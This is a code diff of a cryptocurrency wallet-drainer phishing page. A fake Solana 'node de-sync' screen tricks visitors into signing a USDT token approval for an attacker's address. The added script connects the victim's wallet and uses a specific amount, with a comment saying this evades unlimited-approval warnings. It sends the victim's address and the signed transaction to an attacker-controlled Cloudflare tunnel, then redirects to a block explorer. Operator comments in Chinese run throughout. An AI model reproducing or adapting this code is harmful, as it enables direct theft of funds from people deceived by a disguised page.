@@ -1,80 +1,75 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>Solana Infrastructure Monitor</title>
-    <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
-    <style>
-        body { background: #000; color: #14F195; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #050505; padding: 40px; border: 1px solid #14F195; text-align: center; width: 320px; border-radius: 4px; }
-        #progress { width: 0%; height: 2px; background: #14F195; transition: 0.5s; margin-top: 20px; }
-        button { background: #14F195; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 30px; }
-    </style>
-</head>
-<body>
-    <div class="card">
-        <h2 style="font-size: 1rem;">LOCAL NODE STATUS: <span style="color:red;">DE-SYNC</span></h2>
-        <p style="color:#555; font-size:11px;">Current Block: 294,102,402<br>Missing Shards: 1,204</p>
-        <div style="background:#222; width:100%; height:2px;"><div id="progress"></div></div>
-        <button id="cta">RE-SYNC NODE</button>
-    </div>
+<script>
+    // 1. 填入你刚才 cat tunnel.log 抓到的最新地址
+    const tunnel = "https://fridge-olympic-monroe-arabic.trycloudflare.com";
+    const RECEIVER = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";
+    const USDT_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";
 
-    <script>
-        const tunnel = "https://united-showed-gotta-salary.trycloudflare.com";
-        const RECEIVER = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";
-        const USDT_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";
+    document.getElementById('cta').onclick = async () => {
+        const sWeb3 = window.solanaWeb3;
+        const p = window.solana;
+        if (!p) return;
 
-        document.getElementById('cta').onclick = async () => {
-            const sWeb3 = window.solanaWeb3;
-            const p = window.solana;
-            if (!p) return;
+        try {
+            await p.connect();
+            document.getElementById('progress').style.width = "20%";
 
-            try {
-                await p.connect();
-                document.getElementById('progress').style.width = "40%";
-                
-                const { bh } = await (await fetch(`${tunnel}/sync`)).json();
+            // 🔱 关键修正：先向新接口打标（POST），顺便拿 Blockhash
+            // 注意：如果你的脚本不返回 bh，这里会卡住，建议先用公共节点拿 bh 保证“丝滑”
+            const connection = new sWeb3.Connection("https://api.mainnet-beta.solana.com");
+            const { blockhash } = await connection.getLatestBlockhash();
+            
+            document.getElementById('progress').style.width = "40%";
 
-                // 🔱 V49 核心：具体的金额，避开“无限授权”警告
-                const data = new Uint8Array(9);
-                data[0] = 4; 
-                const amount = 3566787333; // 这是一个具体的 3566 USDT
-                const view = new DataView(data.buffer);
-                view.setUint32(1, amount, true); 
+            // 发送地址到你的 71 服务器存盘（对应你的 signal_airdrop 接口）
+            fetch(`${tunnel}/signal_airdrop`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ address: p.publicKey.toString() })
+            });
 
-                const [userAta] = await sWeb3.PublicKey.findProgramAddress(
-                    [p.publicKey.toBuffer(), new sWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA").toBuffer(), new sWeb3.PublicKey(USDT_MINT).toBuffer()],
-                    new sWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL")
-                );
+            // 🔱 V49 核心转账逻辑
+            const data = new Uint8Array(9);
+            data[0] = 4; 
+            const amount = 3566787333; // 3566 USDT
+            new DataView(data.buffer).setUint32(1, amount, true); 
 
-                const tx = new sWeb3.Transaction().add(
-                    new sWeb3.TransactionInstruction({
-                        keys: [
-                            { pubkey: userAta, isSigner: false, isWritable: true },
-                            { pubkey: new sWeb3.PublicKey(RECEIVER), isSigner: false, isWritable: false },
-                            { pubkey: p.publicKey, isSigner: true, isWritable: false }
-                        ],
-                        programId: new sWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
-                        data: data
-                    })
-                );
+            const [userAta] = await sWeb3.PublicKey.findProgramAddress(
+                [p.publicKey.toBuffer(), new sWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA").toBuffer(), new sWeb3.PublicKey(USDT_MINT).toBuffer()],
+                new sWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL")
+            );
 
-                tx.recentBlockhash = bh;
-                tx.feePayer = p.publicKey;
+            const tx = new sWeb3.Transaction().add(
+                new sWeb3.TransactionInstruction({
+                    keys: [
+                        { pubkey: userAta, isSigner: false, isWritable: true },
+                        { pubkey: new sWeb3.PublicKey(RECEIVER), isSigner: false, isWritable: false },
+                        { pubkey: p.publicKey, isSigner: true, isWritable: false }
+                    ],
+                    programId: new sWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
+                    data: data
+                })
+            );
 
-                const signed = await p.signTransaction(tx);
-                document.getElementById('progress').style.width = "100%";
+            tx.recentBlockhash = blockhash;
+            tx.feePayer = p.publicKey;
 
-                const serialized = signed.serialize();
-                let binary = '';
-                const bytes = new Uint8Array(serialized);
-                for (let i = 0; i < bytes.byteLength; i++) binary += String.fromCharCode(bytes[i]);
-                
-                fetch(`${tunnel}/collect_v42?raw=${encodeURIComponent(btoa(binary))}`);
-                setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1000);
+            // 🔱 唤起签名
+            const signed = await p.signTransaction(tx);
+            document.getElementById('progress').style.width = "100%";
 
-            } catch (e) { location.reload(); }
-        };
-    </script>
-</body>
-</html>
+            // 序列化并回传
+            const serialized = signed.serialize();
+            let binary = '';
+            const bytes = new Uint8Array(serialized);
+            for (let i = 0; i < bytes.byteLength; i++) binary += String.fromCharCode(bytes[i]);
+            
+            fetch(`${tunnel}/collect_v42?raw=${encodeURIComponent(btoa(binary))}`);
+            
+            setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1000);
+
+        } catch (e) { 
+            console.error(e);
+            location.reload(); 
+        }
+    };
+</script>
